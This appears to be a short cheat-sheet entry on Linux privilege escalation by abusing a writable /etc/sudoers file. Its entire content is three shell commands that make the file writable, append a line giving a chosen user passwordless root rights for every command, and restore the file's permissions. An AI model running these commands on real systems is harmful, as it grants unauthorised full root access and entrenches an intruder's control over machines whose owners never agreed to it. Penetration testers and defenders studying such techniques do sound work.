---
title: "sudoers"
date: 2024-7-3
tags: ["sudoers", "sudo", "privesc", "/etc/sudoers"]
---

---
### Privesc

#### Abuse `/etc/sudoers`

```bash
# IF you have control over `/etc/sudoers`
chmod 600 /etc/sudoers
```

```bash
echo '<USER>   ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
```

```bash
chmod 440 /etc/sudoers
```

<br>
